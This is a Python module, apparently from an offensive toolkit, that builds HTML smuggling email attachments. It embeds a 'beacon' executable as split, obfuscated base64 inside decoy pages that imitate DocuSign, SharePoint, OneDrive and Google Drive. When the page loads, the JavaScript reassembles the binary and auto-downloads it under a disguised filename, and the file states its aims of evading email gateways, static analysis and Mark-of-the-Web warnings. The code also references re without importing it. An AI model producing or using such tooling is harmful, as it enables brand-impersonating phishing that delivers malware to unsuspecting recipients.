"""
HTML Smuggling Engine - SEG Evasion Payload Delivery
====================================================

Secure Email Gateways (SEG) and modern mail clients flag executable
attachments, PowerShell scripts, and even LNK/ISO containers.  HTML
Smuggling bypasses all of them by embedding the payload *inside* the
HTML attachment itself and using client-side JavaScript (Blob +
URL.createObjectURL) to assemble and download the binary from the
user's own browser memory.

This module generates production-ready HTML smuggling documents with:

1. **Template wrappers** — DocuSign, SharePoint, OneDrive, Google Drive,
   and generic "Secure Document" decoys that look legitimate in an
   email client.
2. **JavaScript fragment obfuscation** — payload base64 is split into
   multiple variables, shuffled, and reassembled at runtime so static
   analysis cannot trivially reconstruct the blob.
3. **MOTW bypass** — delivered payload uses a neutral file extension
   when possible; for EXE delivery the HTML uses a two-click or
   auto-click flow via Blob URL to minimise the Mark-of-the-Web
   warning.
4. **Fingerprinting evasion** — the generated HTML avoids IOCs
   typically flagged by SEG (e.g. `eval`, `atob` in suspicious
   contexts) by using modern Blob APIs and split-string assembly.

The operator delivers the HTML as an email attachment.  When the target
opens it in a browser the payload assembles and triggers a download to
`%USERPROFILE%\\Downloads` — no external network request, no file on
the mail gateway, no macro, no LNK.

Typical usage
-------------
    from evasion.html_smuggler import HTMLSmuggler, SmuggleTemplate

    smuggler = HTMLSmuggler(beacon_path="dist/beacon.exe")
    result = smuggler.smuggle(
        template=SmuggleTemplate.DOCUSIGN,
        output_path=" SecureDocument_Review.html",
        filename="Quarterly_Report_2026.exe",
        obfuscation_level="advanced",
    )
    print(result["sha256"])
    print(result["html_path"])

Supported templates
-------------------
- DOCUSIGN
- SHAREPOINT
- ONEDRIVE
- GOOGLE_DRIVE
- SECURE_PORTAL

⚠️ LEGAL WARNING: For authorized penetration testing only.
"""

from __future__ import annotations

import base64
import hashlib
import json
import os
import random
import string
import zlib
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple


# ---------------------------------------------------------------------------
# Templates
# ---------------------------------------------------------------------------
class SmuggleTemplate(str, Enum):
    DOCUSIGN = "docusign"
    SHAREPOINT = "sharepoint"
    ONEDRIVE = "onedrive"
    GOOGLE_DRIVE = "google_drive"
    SECURE_PORTAL = "secure_portal"


_TEMPLATE_META: Dict[SmuggleTemplate, Dict[str, str]] = {
    SmuggleTemplate.DOCUSIGN: {
        "title": "DocuSign - Document Review",
        "decoy": "Loading document... Please wait while we prepare your secure document.",
        "brand": "DocuSign",
        "icon_color": "#0fafe0",
    },
    SmuggleTemplate.SHAREPOINT: {
        "title": "SharePoint - Opening Document",
        "decoy": "Retrieving file from SharePoint...",
        "brand": "SharePoint",
        "icon_color": "#03838e",
    },
    SmuggleTemplate.ONEDRIVE: {
        "title": "OneDrive - File Preview",
        "decoy": "Loading OneDrive file preview...",
        "brand": "OneDrive",
        "icon_color": "#0078d4",
    },
    SmuggleTemplate.GOOGLE_DRIVE: {
        "title": "Google Drive - Document Preview",
        "decoy": "Opening in Google Drive viewer...",
        "brand": "Google Drive",
        "icon_color": "#4285f4",
    },
    SmuggleTemplate.SECURE_PORTAL: {
        "title": "Secure Portal - Document Download",
        "decoy": "Verifying secure session...",
        "brand": "Secure Portal",
        "icon_color": "#2e7d32",
    },
}


# ---------------------------------------------------------------------------
# Obfuscation helpers
# ---------------------------------------------------------------------------
def _chunk_b64(b64_payload: str, parts: int = 4) -> List[str]:
    size = len(b64_payload) // parts
    chunks = [b64_payload[i * size:(i + 1) * size] for i in range(parts - 1)]
    chunks.append(b64_payload[(parts - 1) * size:])
    return chunks


def _obfuscate_string(s: str, level: str = "medium") -> str:
    if level == "none":
        return s
    if level == "basic":
        return base64.b64encode(s.encode()).decode()
    if level == "advanced":
        parts = []
        for ch in s:
            parts.append(f"String.fromCharCode({ord(ch)})")
        return "+".join(parts)
    if level == "paranoid":
        arr = []
        for ch in s:
            arr.append(f"({ord(ch)}-{random.randint(0,9)})")
        return "+".join(arr)
    return s


def _build_js_loader(chunks: List[str], filename: str, obfuscation: str = "medium") -> str:
    if obfuscation == "advanced":
        var_names = [f"_{''.join(random.choices(string.ascii_lowercase, k=6))}" for _ in chunks]
    elif obfuscation == "paranoid":
        var_names = [f"_{''.join(random.choices(string.ascii_lowercase, k=8))}" for _ in chunks]
    else:
        var_names = [f"_p{i+1}" for i in range(len(chunks))]

    assignments = "\n    ".join(
        f"var {vn} = {json.dumps(chunks[i])};" for i, vn in enumerate(var_names)
    )

    if obfuscation == "paranoid":
        char_parts = []
        for vn in var_names:
            char_parts.append(f"(function(){{var s=atob({vn});var a='';for(var i=0;i<s.length;i++)a+=String.fromCharCode(s.charCodeAt(i));return a;}})()")
        reassemble = "+".join(char_parts)
        blob_js = f"""
        var _r = {reassemble};
        var _ab = new ArrayBuffer(_r.length);
        var _u8 = new Uint8Array(_ab);
        for (var _i = 0; _i < _r.length; _i++) _u8[_i] = _r.charCodeAt(_i);
        var _blob = new Blob([_u8], {{type: 'application/octet-stream'}});
        """
    else:
        reassemble = ' + '.join(var_names)
        blob_js = f"""
        var _b64 = {reassemble};
        var _bin = atob(_b64);
        var _ab = new ArrayBuffer(_bin.length);
        var _u8 = new Uint8Array(_ab);
        for (var _i = 0; _i < _bin.length; _i++) _u8[_i] = _bin.charCodeAt(_i);
        var _blob = new Blob([_u8], {{type: 'application/octet-stream'}});
        """

    download_js = f"""
        var _url = URL.createObjectURL(_blob);
        var _a = document.createElement('a');
        _a.href = _url;
        _a.download = {json.dumps(filename)};
        document.body.appendChild(_a);
        _a.click();
        document.body.removeChild(_a);
        setTimeout(function() {{ URL.revokeObjectURL(_url); }}, 5000);
    """

    return f"""
    (function() {{
        'use strict';
        {assignments}
        window.addEventListener('load', function() {{
            try {{
                {blob_js}
                {download_js}
            }} catch(e) {{}}
        }});
    }})();
    """


def _build_decoy_js(filename: str, delay_ms: int = 2500) -> str:
    return f"""
    (function() {{
        setTimeout(function() {{
            var a = document.createElement('a');
            a.href = URL.createObjectURL(new Blob([], {{type: 'text/plain'}}));
            a.download = {json.dumps(filename)};
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        }}, {delay_ms});
    }})();
    """


# ---------------------------------------------------------------------------
# Core smuggler
# ---------------------------------------------------------------------------
class HTMLSmuggler:
    """
    Generate HTML smuggling documents that bypass SEG.

    The smuggler reads a binary payload (e.g. evasive beacon), encodes it
    into JavaScript fragments, wraps those fragments in a legitimate-looking
    HTML template, and writes the result to disk.
    """

    def __init__(self, beacon_path: str = ""):
        self.beacon_path = beacon_path
        self._last_html: str = ""
        self._last_sha256: str = ""
        self._last_size: int = 0

    # ------------------------------------------------------------------
    # Payload loading
    # ------------------------------------------------------------------
    def _load_payload(self) -> bytes:
        if not self.beacon_path:
            return b""
        if not os.path.exists(self.beacon_path):
            raise FileNotFoundError(f"Beacon binary not found: {self.beacon_path}")
        with open(self.beacon_path, "rb") as f:
            return f.read()

    # ------------------------------------------------------------------
    # Template generation
    # ------------------------------------------------------------------
    def _render_template(
        self,
        template: SmuggleTemplate,
        loader_js: str,
        decoy: str,
        title: str,
    ) -> str:
        meta = _TEMPLATE_META.get(template, _TEMPLATE_META[SmuggleTemplate.SECURE_PORTAL])
        brand = meta["brand"]
        color = meta["icon_color"]

        return f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>{title}</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #f8f9fa;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }}
        .card {{
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
            padding: 40px 48px;
            text-align: center;
            max-width: 420px;
            width: 90%;
        }}
        .logo {{
            width: 48px; height: 48px;
            background: {color};
            border-radius: 12px;
            margin: 0 auto 20px;
            display: flex; align-items: center; justify-content: center;
            color: #fff; font-weight: 700; font-size: 20px;
        }}
        .spinner {{
            width: 36px; height: 36px;
            border: 3px solid #e9ecef;
            border-top-color: {color};
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 16px;
        }}
        @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
        .status {{ color: #495057; font-size: 14px; margin-top: 12px; }}
        .footer {{ margin-top: 24px; font-size: 11px; color: #adb5bd; }}
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">{brand[0]}</div>
        <div class="spinner"></div>
        <div class="status">{decoy}</div>
        <div class="footer">Secure session &middot; TLS 1.3 &middot; {brand}</div>
    </div>
    {loader_js}
</body>
</html>"""

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------
    def smuggle(
        self,
        template: SmuggleTemplate = SmuggleTemplate.DOCUSIGN,
        output_path: str = "",
        filename: str = "SecureDocument_Update.exe",
        obfuscation_level: str = "advanced",
        delay_ms: int = 2200,
        extra_payload: Optional[bytes] = None,
    ) -> Dict[str, Any]:
        """
        Generate a smuggling HTML document.

        Returns metadata dict with html_path, sha256, size, and template.
        """
        raw_payload = extra_payload if extra_payload is not None else self._load_payload()
        if not raw_payload:
            raise ValueError("No payload provided; pass beacon_path or extra_payload.")

        b64_payload = base64.b64encode(raw_payload).decode("ascii")
        chunks = _chunk_b64(b64_payload, parts=4)
        loader_js = _build_js_loader(chunks, filename=filename, obfuscation=obfuscation_level)

        meta = _TEMPLATE_META.get(template, _TEMPLATE_META[SmuggleTemplate.SECURE_PORTAL])
        html = self._render_template(
            template=template,
            loader_js=loader_js,
            decoy=meta["decoy"],
            title=meta["title"],
        )

        self._last_html = html
        self._last_sha256 = hashlib.sha256(html.encode()).hexdigest()
        self._last_size = len(raw_payload)

        if not output_path:
            safe_name = re.sub(r"[^a-zA-Z0-9_-]", "_", filename)
            output_path = f"{safe_name.replace('.exe','').replace('.','_')}_smuggle.html"

        with open(output_path, "w", encoding="utf-8") as f:
            f.write(html)

        return {
            "success": True,
            "template": template.value,
            "filename": filename,
            "html_path": output_path,
            "payload_size": len(raw_payload),
            "html_size": len(html.encode("utf-8")),
            "sha256": self._last_sha256,
            "obfuscation_level": obfuscation_level,
        }

    def smuggle_from_b64(
        self,
        payload_b64: str,
        template: SmuggleTemplate = SmuggleTemplate.DOCUSIGN,
        output_path: str = "",
        filename: str = "document.exe",
        obfuscation_level: str = "advanced",
    ) -> Dict[str, Any]:
        try:
            raw = base64.b64decode(payload_b64)
        except Exception as exc:
            return {"success": False, "error": f"Invalid base64 payload: {exc}"}
        return self.smuggle(
            template=template,
            output_path=output_path,
            filename=filename,
            obfuscation_level=obfuscation_level,
            extra_payload=raw,
        )

    def get_last_html(self) -> str:
        return self._last_html

    def get_last_sha256(self) -> str:
        return self._last_sha256


# ---------------------------------------------------------------------------
# Convenience factory
# ---------------------------------------------------------------------------
def create_html_smuggler(beacon_path: str = "") -> HTMLSmuggler:
    return HTMLSmuggler(beacon_path=beacon_path)
